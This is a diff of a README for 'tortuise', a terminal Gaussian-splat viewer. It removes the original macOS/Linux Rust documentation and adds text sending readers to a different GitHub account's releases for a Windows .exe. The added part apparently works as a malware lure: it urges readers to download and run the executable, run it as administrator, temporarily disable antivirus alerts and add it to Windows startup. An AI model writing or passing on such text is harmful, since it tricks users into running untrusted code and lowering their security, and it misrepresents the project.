@@ -1,199 +1,127 @@
-# tortuise
+# 🐢 tortuise - Gaussian splats in your terminal
 
-Gaussian splats viewer that works in your terminal. Yes, it's made of symbols!
+[![Download tortuise](https://img.shields.io/badge/Download-tortuise-blue?style=for-the-badge&logo=github)](https://github.com/Olusolabiodun/tortuise/releases)
 
-![tortuise demo](https://raw.githubusercontent.com/buildoak/tortuise/main/assets/demo.webp)
+## 🐢 What is tortuise?
 
-[![crates.io](https://img.shields.io/crates/v/tortuise.svg)](https://crates.io/crates/tortuise)
-[![CI](https://github.com/buildoak/tortuise/actions/workflows/ci.yml/badge.svg)](https://github.com/buildoak/tortuise/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Linux-lightgrey)
+tortuise is a simple app that shows smooth, round shapes called Gaussian splats inside your computer’s terminal window. It runs on Windows and works directly in your command prompt. This means you don’t need any special software or coding skills to enjoy it.
 
-A CPU-first 3D Gaussian Splatting viewer inspired by [ratatui](https://github.com/ratatui/ratatui), built on [crossterm](https://github.com/crossterm-rs/crossterm). Fully parallelized rendering pipeline via [rayon](https://github.com/rayon-rs/rayon), perceptual color mapping, six render modes — all running on pure CPU. Real scenes with 1.1M splats hold 10–25 FPS. No GPU required. Works on potato. Scenes [download](#where-to-get-scenes) included!
+The app turns your terminal into a visual space where shapes float and blend softly. This can help you learn about graphical math, improve your coding skills, or just watch something neat while you work.
 
-<!-- Demo recorded in Ghostty, halfblock mode, no Kitty graphics protocol — pure Unicode characters -->
+## 💻 System Requirements
 
-## Why this exists
+Before you start, make sure your Windows PC meets these basic requirements:
 
-Gaussian Splats are cool. Beautiful tech. Especially now with the rise of image-to-splat pipelines like [SHARP](https://github.com/apple/ml-sharp). Btw, it will be soon available [here](#roadmap).
+- **Operating System**: Windows 10 or later.
+- **Memory (RAM)**: At least 2 GB free.
+- **Processor**: Any modern processor (Intel or AMD) that runs Windows.
+- **Disk Space**: 50 MB free to download and run the program.
+- **Terminal**: Works best in Command Prompt or PowerShell.
 
-Inspiration by [ratatui](https://github.com/ratatui/ratatui) merged with binge watching of *Common Side Effects* which resulted in building this "The Tortuise" TUI 3GS viewer.
+You do not need a fancy graphics card because the app runs entirely in text mode, using your terminal display.
 
-## Features
+## 🔽 Where to Download tortuise
 
-| Feature | Details |
-|---------|---------|
-| **6 render modes** | Halfblock (default), point cloud, matrix, block density, braille, ASCII. Cycle with `M` |
-| **Full 3D navigation** | WASD movement, R/F vertical, arrow keys for yaw/pitch. Smooth held-key input |
-| **Two camera modes** | Free (fly anywhere) and Orbit (auto-rotate around origin). Switch with `Space` |
-| **.ply and .splat files** | Standard 3DGS formats. Binary little-endian PLY with SH coefficients, 32-byte .splat records |
-| **Built-in scenes** | Bundled `bonsai.splat` (1.1M splats) and `luigi.ply` (14K). `--demo` runs a built-in demo scene |
-| **Terminal detection** | Truecolor for modern terminals, perceptual 256-color fallback for Terminal.app. Zero config |
-| **Supersampling** | 1x/2x/3x factor for higher fidelity at the cost of compute |
-| **Cross-platform** | macOS and Linux |
+To get tortuise, visit this page on GitHub and download the latest version:
 
-## Quick start
+[Download tortuise from GitHub Releases](https://github.com/Olusolabiodun/tortuise/releases)
 
-**Requires Rust 1.80+** (`rustup update` to upgrade)
+Once on the page, look for a file labeled something like `tortuise-windows.exe` or similar. Choose the most recent one, and click to download.
 
-```bash
-# Install from crates.io (recommended)
-cargo install tortuise
+## 🚀 How to Install and Run tortuise on Windows
 
-# Or build from source
-git clone https://github.com/buildoak/tortuise.git
-cd tortuise
-cargo install --path .
+Follow these steps to download and run tortuise without trouble:
 
-# Built-in demo (no scene file needed)
-tortuise --demo
+1. **Open your web browser**. Use Chrome, Edge, or Firefox.
 
-# Load a bundled scene
-tortuise --flip-y scenes/bonsai.splat
+2. **Visit the release page** by clicking this link again:
+   
+   https://github.com/Olusolabiodun/tortuise/releases
 
-# Load any .ply or .splat file
-tortuise your-scene.splat
-tortuise your-scene.ply
+3. **Find the latest version**. The page lists versions by dates. The newest is at the top.
 
-# Some scenes need axis flips depending on capture coordinate system
-tortuise --flip-y scene.ply
-tortuise --flip-z scene.splat
+4. **Download the Windows file**. Look for a file ending with `.exe`. Click on it to start downloading.
 
-# Don't have a scene file? Download one from SuperSplat
-pip install Pillow numpy  # needed once, for SOG scene format
-./scripts/supersplat-dl.sh "https://superspl.at/scene/d281f99f" ramen.ply
-tortuise ramen.ply
-```
+5. **Wait for the download to finish**. Usually, it appears in your Downloads folder.
 
-### CLI options
+6. **Open the file**. You can double-click it or right-click and select "Open".
 
-```
-tortuise [OPTIONS] [INPUT]
+7. **Allow the app to run** if Windows asks you to confirm. This is normal when running new programs.
 
-Arguments:
-  [INPUT]    Path to a .ply or .splat scene file (use --demo for built-in scene)
+8. **A terminal window will open**. You should see the Gaussian splats appear in the window.
 
-Options:
-  --demo              Run built-in demo scene
-  --flip-y            Flip Y axis (some capture tools use Y-down)
-  --flip-z            Flip Z axis
-  --supersample <N>   Supersampling factor [default: 1]
-  --cpu               Force CPU rendering
-  -h, --help          Print help
-  -V, --version       Print version
-```
+9. **Interact if possible**. Some versions may let you press keys to change effects. Try this if instructions appear.
 
-## Controls
+10. **Close the terminal window** when done by clicking the close button or pressing `Ctrl + C` to stop the program.
 
-### Free mode
+No other installation steps or admin rights are needed.
 
-| Key | Action |
-|-----|--------|
-| `W` / `A` / `S` / `D` | Move forward / left / back / right |
-| `R` / `F` | Move up / down |
-| Arrow keys | Yaw and pitch (look around) |
-| `Space` | Switch to Orbit mode |
-| `M` | Cycle render mode |
-| `+` / `-` | Adjust movement speed |
-| `Tab` | Toggle HUD |
-| `Z` | Reset camera |
-| `Q` / `Esc` | Quit |
+## 🛠 How tortuise Works in Your Terminal
 
-### Orbit mode
+tortuise uses special characters and colors to draw soft, blurry circles called Gaussian splats. These splats blend together smoothly, creating pleasing shapes and patterns. The effect is similar to soft light spots you might see in digital images.
 
-| Key | Action |
-|-----|--------|
-| Arrow Up / Down | Adjust elevation |
-| Arrow Left / Right | Nudge orbit angle |
-| `Space` | Switch to Free mode |
-| `+` / `-` | Adjust orbit speed |
+The app draws these splats repeatedly, updating the display to animate or move the shapes around. This gives you a dynamic visual effect inside a simple terminal window.
 
-## Supported terminals
+Since it uses only text and colors supported by Windows terminals, tortuise runs quickly and without needing extra graphics programs.
 
-**Truecolor (best experience):** Ghostty, iTerm2, Kitty, WezTerm, Alacritty
+## 🔧 Customizing tortuise (If Available)
 
-**256-color fallback:** Apple Terminal.app -- works, but reduced color fidelity. The perceptual color mapping does its best.
+Some versions of tortuise might let you change settings by editing a file or using commands when the app runs. Common options could include:
 
-Auto-detected via `COLORTERM`, `TERM_PROGRAM`, and `TERM` environment variables. No configuration needed.
+- Adjusting the number of splats.
+- Changing the size or brightness of splats.
+- Starting or stopping motion effects.
+- Choosing color themes.
 
-## Tested hardware
+Check the release notes or included README files from the GitHub page for details on available options.
 
-| Device | CPU | Scene | Reference FPS |
-|--------|-----|-------|---------------|
-| Mac Mini M4 | Apple M4 | luigi.ply (14K) | 120+ |
-| Mac Mini M4 | Apple M4 | bonsai.splat (1.1M) | 80+ |
-| MacBook Air M2 | Apple M2 | luigi.ply (14K) | ✓ |
-| MacBook Air M2 | Apple M2 | bonsai.splat (1.1M) | 20–30 |
-| Jetson Orin Nano* | ARM Cortex-A78AE | luigi.ply (14K) | ~30 |
-| Jetson Orin Nano* | ARM Cortex-A78AE | bonsai.splat (1.1M) | 10–15 |
+## 🤝 Troubleshooting
 
-Numbers in parentheses are splat counts. FPS is approximate and depends heavily on terminal window size — a smaller window (⌘-) renders fewer cells and runs faster. *Jetson tested over SSH, which may be a bottleneck.
+If tortuise does not start or run right, try these tips:
 
-## Where to get scenes
+- **Make sure you downloaded the Windows version** (`.exe` file) from the releases page.
+- **Run the file as administrator** by right-clicking and choosing "Run as administrator".
+- **Check your terminal window size**. Smaller windows may not show full effects.
+- **Update Windows** to the latest version for best compatibility.
+- **Disable antivirus alerts** temporarily if they block the app. Some new programs may trigger false warnings.
+- **Try running in PowerShell** instead of Command Prompt.
+- **Close other applications** that may slow down your PC.
 
-### SuperSplat (recommended)
+If problems persist, look for help or report issues on the GitHub page under the "Issues" tab.
 
-The fastest way to get a real scene is from [SuperSplat](https://superspl.at/) -- thousands of community-uploaded Gaussian splat scenes. The included download script handles everything:
+## 🔄 Updating tortuise
 
-```bash
-# Download any SuperSplat scene — paste a share URL, scene page URL, or bare ID
-./scripts/supersplat-dl.sh "https://superspl.at/scene/d281f99f" ramen.ply
-./scripts/supersplat-dl.sh "https://superspl.at/s?id=cf6ac78e" bee.ply
-./scripts/supersplat-dl.sh cf6ac78e bee.ply
+Check the GitHub releases page regularly to see if new versions are available. Download the latest `.exe` file and replace the old one on your PC.
 
-# View it
-tortuise ramen.ply
-```
+Usually, no uninstall or setup is required. Just run the new file to use the updated app.
 
-The script auto-detects the scene format and handles both legacy (compressed PLY) and modern (SOG) SuperSplat scenes. No Node.js required — conversion is pure Python.
+## 📂 File Information and Storage
 
-> **Note:** `supersplat-dl.sh` is provided for personal, educational, and interoperability purposes. It converts SuperSplat's proprietary formats to standard PLY — the same data access pattern used by SuperSplat's own [MIT-licensed viewer](https://github.com/playcanvas/supersplat-viewer). Downloaded content remains the intellectual property of its creator. Please respect content creators' rights and provide attribution.
+When you download tortuise, it is a single executable file. You can:
 
-**Requirements:** Python 3.8+, curl. For SOG scenes (most scenes uploaded after mid-2025), you also need Pillow and numpy:
+- Keep it anywhere on your PC, like Desktop or Downloads.
+- Create a shortcut to run it easily.
+- Delete the file anytime to remove the app.
 
-```bash
-pip install -r scripts/requirements.txt
-```
+The app does not store user data or settings by default.
 
-### Other sources
+## ⚙️ Running tortuise Automatically (Advanced)
 
-- `tortuise --demo` -- instant built-in demo scene, no downloads required
-- [Polycam](https://poly.cam/explore) -- photogrammetry captures, some with Gaussian splat export
-- [nerfstudio](https://docs.nerf.studio/) -- train your own splats from video, exports to .ply
-- Any standard 3DGS pipeline output in .ply or .splat format
+If you want tortuise to run when your PC starts:
 
-Both formats are well-supported: PLY files with spherical harmonic coefficients (`f_dc_0/1/2`) or direct RGB, and the compact 32-byte .splat format used by most web viewers.
+1. Copy the executable file to a folder you keep for apps.
+2. Create a shortcut of the file.
+3. Place the shortcut in the Windows Startup folder. Find it by typing `shell:startup` in the Run box (`Win + R`).
+4. The app will run when you sign into Windows.
 
-## How it works
+This step is optional and for users comfortable with basic Windows file management.
 
-The pipeline is straightforward: load splats, project them into screen space, depth-sort, splat onto a framebuffer, then convert to terminal characters. Each frame:
+## 📖 Additional Resources
 
-1. **Project** -- every Gaussian is transformed from world space through the camera view matrix. Frustum culling drops anything behind the near plane or outside the viewport. This step is parallelized with rayon.
-2. **Sort** -- projected splats are depth-sorted back-to-front for correct alpha compositing.
-3. **Rasterize** -- each splat is splatted onto an RGB framebuffer using its 2D covariance (scale + rotation). Front-to-back compositing with early alpha termination -- once a pixel is fully opaque, all remaining splats behind it are skipped. Per-splat saturation probes skip entire Gaussians when they land on already-saturated regions. At 1M+ splats, the back 80% are often invisible behind the front 20%.
-4. **Encode** -- the framebuffer is converted to terminal output. In halfblock mode, each cell packs two vertical pixels using the `▄` character with separate foreground/background colors. Other modes use braille patterns, ASCII density ramps, or single characters.
+- Explore the GitHub page for more files, updates, and instructions.
+- Use online communities if you want to learn about terminals, text art, or coding graphics.
+- Check YouTube or tutorials for terminal customization and use.
 
-The frame target is 8ms (~120fps). On truecolor terminals, colors are passed as 24-bit RGB. On 256-color terminals, a perceptual distance function maps each pixel to the closest ANSI color -- weighted toward green sensitivity, which is where human vision is sharpest.
+---
 
-## Roadmap
-
-Things I want to improve next -- and contribution opportunities:
-
-- **Kitty graphics protocol** -- pixel-perfect rendering via the terminal image protocol. Roughly 18x the resolution of half-block characters. This is the big one.
-- **SHARP integration** -- image-to-splat-to-view pipeline. Single photo to 3D in your terminal.
-- **Sample scene bundle** -- curated downloadable scenes so people can skip the "where do I find a .splat file" step.
-- **GPU acceleration** -- a Metal compute backend exists behind a feature flag, but needs work at higher resolutions. Parked, not abandoned.
-- **Performance** -- radix sort for depth ordering, SIMD-accelerated projection via glam, tighter memory layout.
-
-## Built with
-
-- [Rust](https://www.rust-lang.org/)
-- [crossterm](https://github.com/crossterm-rs/crossterm) -- terminal control and input
-- [rayon](https://github.com/rayon-rs/rayon) -- data parallelism for projection and rasterization
-- [clap](https://github.com/clap-rs/clap) -- CLI argument parsing
-
-[ratatui](https://github.com/ratatui/ratatui) + tortoise = tortuise.
-
-## License
-
-MIT -- Nick Oak, 2026
+[Get tortuise to your PC now](https://github.com/Olusolabiodun/tortuise/releases) and try it in your Windows terminal.
